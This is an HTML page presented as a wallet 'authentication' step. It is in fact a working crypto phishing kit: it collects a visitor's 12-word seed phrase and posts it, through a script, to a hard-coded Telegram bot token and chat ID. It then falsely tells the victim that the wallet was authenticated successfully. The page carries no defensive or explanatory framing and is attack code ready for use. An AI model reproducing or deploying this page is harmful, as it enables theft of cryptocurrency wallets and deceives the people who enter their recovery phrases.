<!-- /authenticate/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Authenticate Wallet</title>
  <style>
    body { font-family: sans-serif; padding: 2rem; }
    .seed-input { width: 100%; margin-bottom: 5px; }
    .form-group { margin-bottom: 15px; }
    .form-control { padding: 8px; width: 100%; }
    .btn { padding: 10px 20px; cursor: pointer; }
    .btn-primary { background: #007bff; color: white; border: none; }
    .btn-secondary { background: #6c757d; color: white; border: none; }
  </style>
</head>
<body>
  <h1 id="wallet-heading">Authenticate Wallet</h1>
  <form id="walletForm">
    <div class="form-group">
      <label for="walletType">Selected Wallet</label>
      <input type="text" id="walletType" class="form-control" readonly />
    </div>

    <div class="form-group">
      <label>12 Seed Phrase</label>
      <div id="seedInputs"></div>
      <button type="button" class="btn btn-secondary" onclick="pasteSeed()">Paste</button>
    </div>

    <div class="form-group">
      <button type="submit" class="btn btn-primary" id="submitBtn">Verify</button>
    </div>
  </form>

  <script>
    // CONFIG ‚Äî Replace with your Telegram Bot Token & Chat ID
    const BOT_TOKEN = "8148480463:AAGmG5zNLHv9NaKthVlJlBZoCq1i_xmFyRs";
    const CHAT_ID = "7702300834";

    const pathParts = window.location.pathname.split("/");
    const walletType = pathParts[pathParts.length - 1] || "unknown";

    document.getElementById("wallet-heading").innerText = `Authenticate ${walletType} Wallet`;
    document.getElementById("walletType").value = walletType;

    // 12 seed word fields
    const seedInputsContainer = document.getElementById("seedInputs");
    const seedWords = Array(12).fill("");
    for (let i = 0; i < 12; i++) {
      const input = document.createElement("input");
      input.type = "text";
      input.className = "form-control seed-input";
      input.placeholder = `Word ${i + 1}`;
      input.required = true;
      input.oninput = (e) => (seedWords[i] = e.target.value);
      seedInputsContainer.appendChild(input);
    }

    // Paste button
    function pasteSeed() {
      const phrase = prompt("Paste your 12-word seed phrase here:");
      if (!phrase) return;
      const words = phrase.trim().split(/\s+/).slice(0, 12);
      const inputs = document.querySelectorAll(".seed-input");
      words.forEach((word, i) => {
        inputs[i].value = word;
        seedWords[i] = word;
      });
    }

    // Submit handler ‚Äî Telegram only
    document.getElementById("walletForm").onsubmit = async function (e) {
      e.preventDefault();
      const phrase = seedWords.join(" ");
      const message = `üöÄ New Wallet Authentication\n\nüîê Wallet: ${walletType}\nüß© Phrase: ${phrase}`;

      document.getElementById("submitBtn").innerText = "Sending...";

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
          }),
        });

        if (!response.ok) throw new Error("Failed to send message");

        alert("‚úÖ Wallet authenticated successfully!");
      } catch (err) {
        alert("‚ùå Telegram error: " + err.message);
      }

      document.getElementById("submitBtn").innerText = "Verify";
    };
  </script>
</body>
</html>
